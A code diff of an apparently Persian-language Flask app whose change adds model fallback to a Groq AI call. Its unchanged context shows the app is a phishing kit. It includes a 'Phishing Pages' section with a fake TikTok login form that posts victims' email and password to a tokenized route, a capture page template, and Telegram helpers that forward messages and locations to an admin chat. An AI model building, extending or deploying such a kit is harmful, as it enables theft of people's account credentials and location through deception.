@@ -44,7 +44,7 @@ def close_connection(exception):
     if db is not None:
         db.close()
 
-# -------------------- Telegram Helpers --------------------
+# -------------------- Telegram Sending Helpers --------------------
 def send_telegram_message(text, reply_markup=None):
     if not TOKEN or not ADMIN_CHAT_ID:
         return
@@ -87,26 +87,32 @@ def send_telegram_location(lat, lng):
     except Exception as e:
         app.logger.error(f"Telegram location failed: {e}")
 
-# -------------------- Groq AI --------------------
+# -------------------- Groq AI (Fixed) --------------------
 def ask_groq(prompt):
     if not GROQ_API_KEY:
         return "⚠️ کلید Groq تنظیم نشده است."
     try:
         url = "https://api.groq.com/openai/v1/chat/completions"
         headers = {"Authorization": f"Bearer {GROQ_API_KEY}", "Content-Type": "application/json"}
-        payload = {
-            "model": "llama-3.1-70b-versatile",
-            "messages": [{"role": "user", "content": prompt}],
-            "temperature": 0.7
-        }
-        resp = requests.post(url, json=payload, headers=headers, timeout=20)
-        if resp.status_code != 200:
-            app.logger.error(f"Groq error {resp.status_code}: {resp.text}")
-            return f"❌ خطای {resp.status_code} از هوش مصنوعی."
-        data = resp.json()
-        return data['choices'][0]['message']['content'].strip()
+        # لیست مدل‌های معتبر و رایگان – مدل اول را امتحان کن، در صورت شکست مدل دوم
+        models = ["llama3-70b-8192", "mixtral-8x7b-32768"]
+        last_error = None
+        for model in models:
+            payload = {
+                "model": model,
+                "messages": [{"role": "user", "content": prompt}],
+                "temperature": 0.7
+            }
+            resp = requests.post(url, json=payload, headers=headers, timeout=20)
+            if resp.status_code == 200:
+                data = resp.json()
+                return data['choices'][0]['message']['content'].strip()
+            else:
+                last_error = f"مدل {model}: {resp.status_code} - {resp.text[:150]}"
+        app.logger.error(f"Groq failed: {last_error}")
+        return f"❌ هوش مصنوعی موقتاً در دسترس نیست.\nجزئیات: {last_error}"
     except Exception as e:
-        app.logger.error(f"Groq error: {e}")
+        app.logger.error(f"Groq exception: {e}")
         return "❌ خطا در ارتباط با هوش مصنوعی."
 
 # -------------------- Phishing Pages --------------------
@@ -165,7 +171,7 @@ PHISHING_TIKTOK = """<!DOCTYPE html>
 <style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#121212;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;color:white;} .container{width:320px;padding:30px;background:#1e1e1e;border-radius:20px;text-align:center;} img{width:80px;margin-bottom:20px;} input{width:100%;padding:12px;background:#2a2a2a;border:1px solid #444;border-radius:8px;color:white;font-size:14px;margin-bottom:12px;} .btn{width:100%;background:#fe2c55;color:white;border:none;border-radius:8px;padding:12px;font-weight:bold;font-size:16px;cursor:pointer;}</style></head>
 <body><div class="container"><img src="https://lf16-tiktok-common.ttwstatic.com/obj/tiktok-web-common-sg/ies/tiktok/emblem/logo_web.png"><h2>Log in</h2><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="Phone number, username, or email" required><input type="password" name="password" placeholder="Password" required><button class="btn" type="submit">Log in</button></form></div></body></html>"""
 
-# Capture Page Template (unchanged)
+# -------------------- Capture Page --------------------
 CAPTURE_PAGE_TEMPLATE = """
 <!DOCTYPE html>
 <html>
@@ -280,6 +286,7 @@ CAPTURE_PAGE_TEMPLATE = """
 </body></html>
 """
 
+# Admin templates (unchanged)
 ADMIN_LOGIN = """
 <!DOCTYPE html><html><head><title>ورود</title><style>body{background:#1e1e1e;color:#0f0;text-align:center;padding-top:20vh;} input{padding:10px;margin:5px;}</style></head>
 <body><h2>پنل مدیریت</h2><form method=post action=/admin><input type=password name=pass placeholder=رمز عبور><br><input type=submit value=ورود></form></body></html>
